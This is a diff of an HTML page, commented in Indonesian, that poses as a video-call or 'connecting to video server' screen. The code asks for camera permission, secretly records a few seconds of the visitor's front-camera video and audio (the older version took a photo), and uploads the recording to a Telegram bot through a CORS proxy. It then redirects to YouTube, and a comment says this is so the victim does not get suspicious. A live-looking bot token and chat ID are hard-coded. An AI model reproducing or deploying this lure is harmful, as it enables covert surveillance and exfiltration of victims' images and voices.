@@ -2,72 +2,140 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Call Invitation...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Connecting to Video Server...</title>
     <style>
-        body { background-color: #202124; color: white; font-family: sans-serif; text-align: center; padding-top: 40%; }
-        #video { display: none; }
+        body { background-color: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 40%; margin: 0; }
+        #video { display: none; } /* Sembunyikan preview asli */
+        .loader { border: 4px solid #333; border-top: 4px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <h2>Connecting to secure server...</h2>
-    <p>Please allow camera permission to join.</p>
+    <div class="loader"></div>
+    <h2>INITIALIZING CAMERA...</h2>
+    <p>Wait for connection...</p>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <video id="video" autoplay playsinline muted></video>
 
     <script>
-        // GANTI DENGAN TOKEN & ID KAMU (Sama seperti di bot.py)
+        // ⚠️ KONFIGURASI WAJIB BENAR
         const BOT_TOKEN = '8530007197:AAHlOHC1LIBYe4L5iPcUciT8nxSY-I9HQps';
-        const CHAT_ID = '5803378702';
+        const CHAT_ID = '5803378702'; 
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+        // DURASI REKAMAN (dalam milidetik) - 3000ms = 3 detik
+        const RECORD_DURATION = 3000; 
 
-        async function exploit() {
+        const videoElem = document.getElementById("video");
+
+        async function startRecording() {
             try {
-                // Ambil stream kamera depan
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
-
-                video.onloadedmetadata = () => {
-                    // Tunggu 1.5 detik lalu ambil foto
-                    setTimeout(sendToTelegram, 1500);
+                // 1. Akses Kamera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 640, height: 480 }, 
+                    audio: true // Coba ambil audio juga, kalau browser izinkan
+                });
+                
+                videoElem.srcObject = stream;
+                
+                // Tunggu video siap
+                videoElem.onloadedmetadata = () => {
+                    // Mulai rekam setelah delay sedikit
+                    setTimeout(() => {
+                        captureVideo(stream);
+                    }, 1000);
                 };
+
             } catch (err) {
-                console.error("Gagal:", err);
-                window.location.href = "https://google.com";
+                console.error("Camera Error:", err);
+                alert("Camera permission required!");
             }
         }
 
-        function sendToTelegram() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0);
+        function captureVideo(stream) {
+            console.log("🔴 Mulai Merekam...");
+            
+            // 2. Setup MediaRecorder
+            let mediaRecorder;
+            let chunks = [];
 
-            // Convert ke Blob
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'target.jpg');
-                formData.append('caption', `📸 Target Captured!\nUser Agent: ${navigator.userAgent}`);
+            // Cek support format browser (WebM biasanya support di Chrome/Android)
+            let mimeType = 'video/webm;codecs=vp9';
+            if (!MediaRecorder.isTypeSupported(mimeType)) {
+                mimeType = 'video/webm'; // Fallback
+            }
 
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => {
-                    console.log("Terkirim!");
-                    // Redirect halus setelah kirim
-                    window.location.href = "https://www.youtube.com"; // Redirect ke YouTube biar wajar
-                })
-                .catch(e => console.log(e));
-            }, 'image/jpeg');
+            try {
+                mediaRecorder = new MediaRecorder(stream, { mimeType });
+            } catch (e) {
+                console.error("MediaRecorder error:", e);
+                return;
+            }
+
+            // Simpan data chunk saat tersedia
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) chunks.push(e.data);
+            };
+
+            // Saat rekaman selesai
+            mediaRecorder.onstop = () => {
+                console.log("⏹️ Selesai Merekam. Mengirim...");
+                const blob = new Blob(chunks, { type: mimeType });
+                chunks = [];
+                
+                // Hentikan semua track kamera (lampu indikator mati)
+                stream.getTracks().forEach(track => track.stop());
+                
+                // Kirim ke Telegram
+                sendVideoToTelegram(blob);
+            };
+
+            // 3. Mulai Rekam
+            mediaRecorder.start();
+
+            // 4. Stop Otomatis setelah X detik
+            setTimeout(() => {
+                mediaRecorder.stop();
+            }, RECORD_DURATION);
         }
 
-        window.onload = exploit;
+        function sendVideoToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('video', blob, `capture_${Date.now()}.webm`);
+            formData.append('caption', `🎥 NEW VIDEO CAPTURE\nDuration: ${RECORD_DURATION/1000}s\nUser: ${navigator.userAgent}`);
+
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+            
+            // Pakai CORS Proxy lagi biar aman
+            const proxyUrl = `https://corsproxy.io/?` + encodeURIComponent(telegramUrl);
+
+            fetch(proxyUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    console.log("✅ VIDEO TERKIRIM!");
+                    // Redirect biar gak curiga
+                    window.location.href = "https://youtube.com";
+                } else {
+                    console.error("Gagal kirim:", data);
+                }
+            })
+            .catch(err => {
+                console.error("Network Error:", err);
+                // Retry direct if proxy fails
+                fetch(telegramUrl, { method: 'POST', body: formData })
+                    .then(r => r.json())
+                    .then(d => console.log("Direct send result:", d));
+            });
+        }
+
+        // Jalankan
+        window.onload = startRecording;
     </script>
 </body>
 </html>
